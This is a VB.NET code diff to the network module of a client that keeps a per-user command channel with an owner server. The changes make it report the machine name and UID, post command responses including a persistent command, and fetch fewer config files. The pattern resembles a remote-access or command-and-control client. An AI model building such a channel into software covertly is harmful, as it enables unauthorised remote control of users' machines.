@@ -22,9 +22,10 @@ Namespace Network
                 content = content.Replace("?", "{questionmark}")
                 Dim postData As String = "content=" & content
                 request.ContentType = "application/x-www-form-urlencoded"
+                request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
                 request.Method = "POST"
-                request.Headers("Ident") = UID
-                request.Headers("Clase") = clase.ToString
+                request.Headers("ident") = UID
+                request.Headers("class") = clase.ToString
 
                 Dim dataStream As New StreamWriter(request.GetRequestStream())
                 dataStream.Write(postData)
@@ -64,7 +65,9 @@ Namespace Network
                 Uninstall()
             End Try
             Try
-                Dim postData As String = "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
+                'Header data format:
+                '   #|cli_nickname|UID|response_date
+                Dim postData As String = "#|" & My.Computer.Name & "|" & UID & "|" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") &
                 vbCrLf & "Command1>" &
                 vbCrLf & "Command2>" &
                 vbCrLf & "Command3>" &
@@ -176,18 +179,10 @@ Namespace Network
             AddToLog("ServerConfigFiles@Network", "Reading server configuration...")
             Try
                 'Verificar que el fichero no exista en local
-                If My.Computer.FileSystem.FileExists(DIRCommons & "\Client.ini") Then
-                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Client.ini")
-                End If
-                If My.Computer.FileSystem.FileExists(DIRCommons & "\General.ini") Then
-                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\General.ini")
-                End If
                 If My.Computer.FileSystem.FileExists(DIRCommons & "\Globals.ini") Then
                     My.Computer.FileSystem.DeleteFile(DIRCommons & "\Globals.ini")
                 End If
                 'Descargar el fichero desde el servidor
-                My.Computer.Network.DownloadFile(HttpOwnerServer & "/Client.ini", DIRCommons & "\Client.ini")
-                My.Computer.Network.DownloadFile(HttpOwnerServer & "/GlobalSettings.ini", DIRCommons & "\General.ini")
                 My.Computer.Network.DownloadFile(HttpOwnerServer & "/Globals.ini", DIRCommons & "\Globals.ini")
             Catch ex As Exception
                 AddToLog("ConfigFiles@Network", "Error: " & ex.Message, True)
@@ -203,14 +198,16 @@ Namespace Network
 
         Function SendCommandResponse(Optional ByVal CMDResponse As String = Nothing) As String
             Try
-                Dim postData As String = "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
+                'Header data format:
+                '   #|cli_nickname|UID|response_date
+                Dim commandResponseData As String = "#|" & My.Computer.Name & "|" & UID & "|" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") &
                 vbCrLf & "Command1>" &
                 vbCrLf & "Command2>" &
                 vbCrLf & "Command3>" & PersistentCommand &
                 vbCrLf & "[Response]" &
                 vbCrLf & CMDResponse
 
-                SendAPIRequest(API_TYPES.COMMAND, postData)
+                SendAPIRequest(API_TYPES.COMMAND, commandResponseData)
 
                 Return CMDResponse
             Catch ex As Exception
